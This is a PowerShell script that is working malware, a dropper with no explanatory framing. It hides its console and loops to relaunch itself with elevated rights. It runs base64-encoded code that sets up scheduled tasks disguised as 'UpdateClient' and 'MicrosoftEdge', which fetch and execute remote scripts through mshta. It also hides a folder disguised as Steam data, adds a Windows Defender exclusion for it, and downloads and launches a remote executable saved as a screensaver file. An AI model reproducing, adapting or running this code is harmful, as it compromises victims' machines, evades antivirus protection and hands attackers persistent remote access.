Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    while(1) {
        try {
            $code = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1")
            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
            exit;
        } catch {}
    }
}

iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JGhpZGRlbnN0YXJ0dXAgPSAiVXBkYXRlQ2xpZW50IgokdGFza19hY3Rpb24gPSBOZXctU2NoZWR1bGVkVGFza0FjdGlvbiAtRXhlY3V0ZSAibXNodGEuZXhlIiAtQXJndW1lbnQgInZic2NyaXB0OmNyZWF0ZW9iamVjdChgIndzY3JpcHQuc2hlbGxgIikucnVuKGAicG93ZXJzaGVsbCBgaXdyKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRVZJTC1ELUUtVi9NL3JlZnMvaGVhZHMvbWFpbi9kb3dubG9hZC5wczEnKXxpZXhgIiwwKSh3aW5kb3cuY2xvc2UpIgokdGFza190cmlnZ2VyID0gTmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2VyIC1BdExvZ09uCiR0YXNrX3NldHRpbmdzID0gTmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldCAtQWxsb3dTdGFydElmT25CYXR0ZXJpZXMgLURvbnRTdG9wSWZHb2luZ09uQmF0dGVyaWVzIC1SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlIC1Eb250U3RvcE9uSWRsZUVuZCAtU3RhcnRXaGVuQXZhaWxhYmxlClJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkdGFza19hY3Rpb24gLVRyaWdnZXIgJHRhc2tfdHJpZ2dlciAtU2V0dGluZ3MgJHRhc2tfc2V0dGluZ3MgLVRhc2tOYW1lICR0YXNrX25hbWUgLURlc2NyaXB0aW9uICJVcGRhdGUgQ2xpZW50IiAtUnVuTGV2ZWwgSGlnaGVzdCAtRm9yY2UKV3JpdGUtSG9zdCAiWyFdIFBlcnNpc3RlbmNlIEFkZGVkIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCgokdGFza19uYW1lID0gIk1pY3Jvc29mdEVkZ2UiCiR0YXNrX2FjdGlvbiA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICJtc2h0YS5leGUiIC1Bcmd1bWVudCAidmJzY3JpcHQ6Y3JlYXRlb2JqZWN0KGAid3NjcmlwdC5zaGVsbGAiKS5ydW4oYCJwb3dlcnNoZWxsIGBpd3IoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80M2ExNzIzL3Rlc3QvbWFpbi9kb3dubG9hZC5wczEnKXxpZXhgIiwwKSh3aW5kb3cuY2xvc2UpIgokdGFza190cmlnZ2VyID0gTmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2VyIC1BdExvZ09uCiR0YXNrX3NldHRpbmdzID0gTmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldCAtQWxsb3dTdGFydElmT25CYXR0ZXJpZXMgLURvbnRTdG9wSWZHb2luZ09uQmF0dGVyaWVzIC1SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlIC1Eb250U3RvcE9uSWRsZUVuZCAtU3RhcnRXaGVuQXZhaWxhYmxlClJlZ2lzdGVyLVNjaGVkdWxlZFRhc2sgLUFjdGlvbiAkdGFza19hY3Rpb24gLVRyaWdnZXIgJHRhc2tfdHJpZ2dlciAtU2V0dGluZ3MgJHRhc2tfc2V0dGluZ3MgLVRhc2tOYW1lICR0YXNrX25hbWUgLURlc2NyaXB0aW9uICJ3aW5kb3dzIHN0YXJ0dXAgZmlsZSIgLVJ1bkxldmVsIEhpZ2hlc3QgLUZvcmNlCldyaXRlLUhvc3QgIlshXSBQZXJzaXN0ZW5jZSBBZGRlZCIgLUZvcmVncm91bmRDb2xvciBHcmVlbg==")))
$rdir = "$env:SystemDrive\ProgramData\Steam"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir
$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClient.exe"
$output = "$dir\Updateclient.scr"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
